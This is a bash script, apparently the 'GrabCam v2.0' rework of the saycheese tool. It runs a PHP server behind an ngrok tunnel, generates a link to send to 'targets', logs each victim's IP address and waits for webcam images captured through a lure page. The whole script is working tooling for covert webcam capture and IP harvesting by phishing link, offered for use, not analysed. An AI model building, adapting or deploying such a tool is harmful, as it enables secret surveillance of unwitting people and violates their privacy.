#!/bin/bash

clear
trap 'printf "\n";stop' 2

banner() {

echo '

                              __
                             /_/\_______
                            /[]\/______/|o -_
                            |     _     ||   -_  
                            |   ((_))   ||     -_
                            |___________|/
                 ___  ____   __   ____   ___   __   _  _ 
                / __)(  _ \ / _\ (  _ \ / __) / _\ ( \/ )
               ( (_ \ )   //    \ ) _ (( (__ /    \/ -- \
                \___/(__\_)\_/\_/(____/ \___)\_/\_/\_)(_) v2.0 ' |lolcat

                                                                               
echo " "
printf "            \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
printf "               \e[1;77m v2.0 This reborn script by dhruvkrishnavaid\e[0m \n"

printf "\n"
}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
exit 1

}

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "PHP required but it's not installed. Install it then re-run this script. Aborting."; exit 1; }

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] A target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Image received!\e[0m\n"
rm -rf log.log
fi
sleep 0.5

done 

}

payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | cut -d "," -f3 | cut -d ":" -f2,3 | cut -d ""\" -f2)
sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip required but it's not installed. Install it then re-run this script. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "wget required but it's not installed. Install it then re-run this script. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Ngrok installation error...\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Ngrok installation error...\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | cut -d "," -f3 | cut -d ":" -f2,3 | cut -d ""\" -f2)
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

init() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
ngrok_server
}

banner
dependencies
init

